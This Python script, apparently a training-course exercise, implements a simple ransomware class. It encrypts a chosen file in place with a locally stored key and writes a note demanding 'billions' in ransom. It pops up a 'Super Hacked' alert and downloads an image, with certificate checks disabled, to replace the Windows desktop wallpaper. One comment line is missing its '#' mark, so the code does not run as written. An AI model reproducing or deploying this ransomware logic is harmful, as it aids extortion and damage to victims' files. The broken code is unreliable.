#!/bin/python3

#Script: Ops 401 Class 08 Ops Challenge Solution
#Author: Marco Aliaga
#Date of latest revision: 26 APR 2023
#Purpose:
#Recursively encrypt a single folder and all its contents.
#Recursively decrypt a single folder that was encrypted by this tool.

#main

#import modules 
import os
import datetime
import pyautogui
import subprocess
import win32gui
import urllib.request
import ssl
import ctypes
from cryptography.fernet import Fernet

#generate key
def writeKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as keyFile:
        keyFile.write(key)

 load_key function that loads the key from the key.key file      
def loadKey():
    return open("key.key", "rb").read()

# def class Ransonware and def 6 ethods
class Ransomware:
  
  #define class constructor sets the sysRoot attribute to the user's home directory and checks if the key.key file exists
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            writeKey()
        self.key = loadKey()

    #prompts the user to enter the path of a file to be encrypted.
    def encryptFile(self):
        filePath = input("Enter the path of the file you want to encrypt: ")
        with open(filePath, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        encrypted = fernet.encrypt(data)
        with open(filePath, "wb") as f:
            f.write(encrypted)
    
    #prompts the user to enter the path of a file to be decrypted.
    def decryptFile(self):
        filePath = input("Enter the path of the file you want to decrypt: ")
        with open(filePath, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        decrypted = fernet.decrypt(data)
        with open(filePath, "wb") as f:
            f.write(decrypted)

    #method downloads an image from a URL and saves it as the user's desktop background
    def changeBackground(self):
        imageUrl = "https://buttonmuseum.org/sites/default/files/SL-take-me-to-your-leader-button-busy-beaver-button-museum.png"
        path = "C:/Windows/Web/wallpaper.jpg"
        context = ssl._create_unverified_context()
        with urllib.request.urlopen(imageUrl, context=context) as u, open(path, 'wb') as f:
            f.write(u.read())
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    #creates a ransom note file named Note.txt with a message threatening the user and asking for a ransom
    def ransomNote(self):
        date = datetime.date.today()
        with open('Note.txt', 'w') as f:
            f.write(f'''Take me to your leader or pay me billions and billions and billions and billions.''')
        pyautogui.alert("Super Hacked")

    #opens the ransom note file in Notepad and brings it to the foreground using the subprocess and win32gui modules
    def popup(self):
        ransom = subprocess.Popen(['notepad.exe', 'Note.txt'])
        topWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())


ransomware = Ransomware()

#while loop is started to continuously prompt the user for an action
while True:
    userInput = input("What would you like to do? (Encrypt, Pop-up, Background, Decrypt, or Exit): ")
    if userInput.lower() == "encrypt":
        ransomware.encryptFile()
    elif userInput.lower() == "pop-up":
        ransomware.ransomNote()
        ransomware.popup()
    elif userInput.lower() == "background":
        ransomware.changeBackground()
    elif userInput.lower() == "decrypt":
        ransomware.decryptFile()
    elif userInput.lower() == "exit":
        break


#end
